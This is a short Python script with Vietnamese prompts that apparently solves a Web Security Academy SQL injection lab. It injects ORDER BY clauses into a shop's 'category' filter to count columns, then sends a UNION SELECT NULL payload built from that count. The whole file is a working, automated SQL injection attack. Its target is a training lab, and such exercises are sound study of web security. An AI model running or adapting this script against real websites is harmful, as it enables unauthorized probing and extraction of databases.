import requests

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")

i = 1
while True:
    r = requests.get(f"{url}/filter?category=Gifts'+ORDER+BY+{i}--")
    if r.status_code == 200:
        i += 1
    else:
        i -= 1
        break

print(f"Tìm thấy số cột hợp lệ: {i}")

nulls = ",+".join(["NULL"] * i)
union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+{nulls}--"

print(f"Payload UNION: {union_url}")
r = requests.get(union_url)
print("✅ Thành công!" if r.status_code == 200 else "❌ Thất bại.")